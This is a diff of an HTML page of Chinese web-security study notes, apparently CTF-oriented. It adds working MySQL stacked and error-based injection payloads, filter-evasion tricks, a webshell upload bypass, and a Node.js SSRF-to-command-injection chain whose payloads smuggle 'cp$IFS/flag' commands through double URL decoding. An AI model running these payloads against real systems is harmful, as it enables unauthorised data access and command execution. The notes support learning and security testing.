-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="c1"># 一个一个试出原始查询语句返回列数, 成功则相应返回将填入相应index
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="c1"># 一个一个试出原始查询语句返回列数, 成功则	相应返回将填入相应index
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
@@ -1721,9 +1919,11 @@
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="err">更改数字，表示以第几列进行排序</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">报错</span><span class="p">:</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="s1">&#39;3&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;order clause&#39;</span><span class="w"> </span><span class="err">则表示有</span><span class="mi">2</span><span class="err">列字段数</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>基础信息</strong></p>
@@ -1786,7 +1986,80 @@
 </div><p><strong>关键字绕过</strong></p>
 <p>将<code>or</code>, <code>select</code>, <code>union</code>, <code>where</code>, <code>and</code>, <code>from</code>进行屏蔽</p>
 <p><code>str_replace</code>函数屏蔽将目标字符串只过滤一次，可以通过双写绕过：<code>uunionnion, sselectelect, oorr</code></p>
-<h2 id="java">JAVA</h2>
+<h4 id="堆叠注入">堆叠注入</h4>
+<ul>
+<li>利用 <code>;</code> 在原SQL查询后追加新语句（有时需将前语句闭合）</li>
+</ul>
+<p><strong>测试</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="k">databases</span><span class="p">;</span><span class="w"> </span><span class="c1"># 获取数据库
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="kp">tables</span><span class="p">;</span><span class="w"> </span><span class="c1"># 查看所有数据表
+</span></span></span><span class="line"><span class="cl"><span class="c1"># 继续查看表x和表123中内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">show</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">x</span><span class="p">;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">show</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="mi">123</span><span class="w"> </span><span class="o">`</span><span class="p">;</span><span class="w"> </span><span class="c1"># 需使用反引号
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>替换</strong>：利用改名，将本不可读取的表数据修改为可读取表中数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">rename</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">t1</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">t2</span><span class="p">;</span><span class="w"> </span><span class="c1"># 将t1表改名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">add</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="no">Null</span><span class="w"> </span><span class="kp">auto_increment</span><span class="w"> </span><span class="k">primary</span><span class="w"> </span><span class="k">key</span><span class="p">;</span><span class="w"> </span><span class="c1"># 新表添加新列名:保持一致操作
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">change</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span><span class="w"> </span><span class="c1"># 改名flag为data
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="报错注入">报错注入</h4>
+<ul>
+<li>获取用户名，数据库，版本</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">extractvalue</span><span class="w"> </span><span class="err">从</span><span class="w"> </span><span class="n">XML</span><span class="w"> </span><span class="err">数据中提取值</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xxx</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">)));</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">user</span><span class="p">(),</span><span class="w"> </span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="k">version</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="绕过">绕过</h4>
+<p><strong>编码预处理绕过</strong></p>
+<ul>
+<li>select被过滤，将SQL语句16进制编码：<code>select * from a</code> ==&gt; <code>123</code></li>
+<li>prepare from预处理进行编码转换，execute执行prepare创建的SQL语句，SET一次只能赋一个值</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SET</span><span class="o">@</span><span class="n">a</span><span class="o">=</span><span class="mi">0</span><span class="n">x123</span><span class="p">;</span><span class="k">prepare</span><span class="w"> </span><span class="n">execsql</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">@</span><span class="n">a</span><span class="p">;</span><span class="k">execute</span><span class="w"> </span><span class="n">execsql</span><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="n">payload</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Handler</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">handler</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">;</span><span class="w"> </span><span class="k">handler</span><span class="w"> </span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="w"> </span><span class="k">read</span><span class="w"> </span><span class="k">next</span><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="err">文件操作读取</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">HANDLER</span><span class="w"> </span><span class="n">FlagHere</span><span class="w"> </span><span class="k">OPEN</span><span class="p">;</span><span class="w"> </span><span class="k">HANDLER</span><span class="w"> </span><span class="n">FlagHere</span><span class="w"> </span><span class="k">READ</span><span class="w"> </span><span class="k">FIRST</span><span class="p">;</span><span class="w"> </span><span class="k">HANDLER</span><span class="w"> </span><span class="n">FlagHere</span><span class="w"> </span><span class="k">CLOSE</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="java">JAVA</h2>
 <h3 id="sql注入">SQL注入</h3>
 <p>漏洞点：字符串拼接</p>
 <div class="highlight"><div class="chroma">
@@ -1859,7 +2132,155 @@
 </span></span><span class="line"><span class="cl"><span class="n">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">execute</span><span class="o">(</span><span class="n">connection</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">sql</span><span class="o">,</span> <span class="n">params</span><span class="o">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="js">JS</h2>
+<h3 id="文件上传">文件上传</h3>
+<p><strong>前端js过滤绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s1">&#39;upload_file&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">allow_ext</span> <span class="o">=</span> <span class="s2">&#34;.jpg|.png|.gif&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">ext_name</span> <span class="o">=</span> <span class="nx">file</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">));</span> <span class="c1">// 上传文件类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">allow_ext</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">ext_name</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">errMsg</span> <span class="o">=</span> <span class="s2">&#34;NO&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nx">errMsg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>一句话木马命名后缀为jpg，后借助burpsuite拦截请求将名称改回</p>
+<h2 id="nodejs">Node.js</h2>
+<h3 id="基础知识-2">基础知识</h3>
+<h3 id="ssrf漏洞-1">SSRF漏洞</h3>
+<h4 id="漏洞点-1">漏洞点</h4>
+<ul>
+<li>设置服务器端口</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">normalizePort</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="s1">&#39;3000&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>此处通过post传入payload再通过get本地服务器访问达成SSRF利用</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// routes/index.js
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">blacklist</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;::ffff:127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="s1">&#39;[::1]&#39;</span><span class="p">,</span><span class="s1">&#39;::1&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// req中ip:客户端IP地址, url:请求URL, query:GET查询参数, body:POST请求体数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 请求对象, 响应对象, 下一步中间件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span> <span class="c1">// 黑名单过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">u</span><span class="o">=</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\&#34;\&#39;]/ig</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span> <span class="c1">// 清除请求url的单双引号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">log</span><span class="o">=</span><span class="sb">`echo &#39;</span><span class="si">${</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">).</span><span class="nx">href</span><span class="si">}</span><span class="sb">&#39;&gt;&gt;/tmp/log`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">child_process</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">log</span><span class="p">);</span> <span class="c1">// 执行命令
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">data</span><span class="o">:</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/tmp/log&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()});</span> <span class="c1">// 读取内容返回
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">u</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">urlObject</span><span class="o">=</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span> <span class="c1">// 解析返回json对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nx">blacklist</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">hostname</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">dest</span><span class="o">=</span><span class="nx">urlObject</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">request</span><span class="p">(</span><span class="nx">dest</span><span class="p">,(</span><span class="nx">err</span><span class="p">,</span><span class="nx">result</span><span class="p">,</span><span class="nx">body</span><span class="p">)=&gt;{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">([]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>构造payload</strong></p>
+<ul>
+<li>进制转换绕过黑名单</li>
+<li>闭合引号加入其余命令：利用nodejs的url库二次解码绕过
+<ul>
+<li><code>@</code>字符前，即表示用户名密码字段，会被二次解码</li>
+</ul>
+</li>
+<li><code>%00</code>或<code>%23</code>截断后续代码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 二次编码 =&gt; web服务器一次解码 http://a%27@a, nodejs二次解码 http://a&#39;@a</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;url&#34;</span>:<span class="s2">&#34;http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp</span><span class="nv">$IFS</span><span class="s2">/flag</span><span class="nv">$IFS</span><span class="s2">/tmp/log%00&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 特殊编码 =&gt; %EF%BC%87解码为&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;url&#34;</span>:<span class="s2">&#34;http://127.1:3000/debug?url=http://%EF%BC%87;cp</span><span class="nv">$IFS</span><span class="s2">/flag</span><span class="nv">$IFS</span><span class="s2">/tmp/log%00&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用POSTMAN，<code>POST -&gt; body -&gt; x-www-form-urlencoded</code></p>
+<h4 id="绕过-1">绕过</h4>
+<p><strong>SSRF黑名单绕过</strong></p>
+<ul>
+<li><code>http://localhost</code></li>
+<li><code>http://[::]:80/</code></li>
+<li>进制转换<code>http://0177.0.0.1/</code>或<code>http://2130706433/</code></li>
+</ul>
+
 </section>
 
 
@@ -2077,7 +2498,9 @@
         
             
         
-        共 204.22k 字 · 共 21篇文章
+            
+        
+        共 219.82k 字 · 共 22篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -2304,7 +2727,11 @@
         <li><a href="#文件上传漏洞">文件上传漏洞</a></li>
         <li><a href="#sql注入漏洞">SQL注入漏洞</a>
           <ol>
+            <li><a href="#漏洞点">漏洞点</a></li>
             <li><a href="#sql操作">SQL操作</a></li>
+            <li><a href="#堆叠注入">堆叠注入</a></li>
+            <li><a href="#报错注入">报错注入</a></li>
+            <li><a href="#绕过">绕过</a></li>
           </ol>
         </li>
       </ol>
@@ -2312,6 +2739,22 @@
     <li><a href="#java">JAVA</a>
       <ol>
         <li><a href="#sql注入">SQL注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#js">JS</a>
+      <ol>
+        <li><a href="#文件上传">文件上传</a></li>
+      </ol>
+    </li>
+    <li><a href="#nodejs">Node.js</a>
+      <ol>
+        <li><a href="#基础知识-2">基础知识</a></li>
+        <li><a href="#ssrf漏洞-1">SSRF漏洞</a>
+          <ol>
+            <li><a href="#漏洞点-1">漏洞点</a></li>
+            <li><a href="#绕过-1">绕过</a></li>
+          </ol>
+        </li>
       </ol>
     </li>
   </ol>
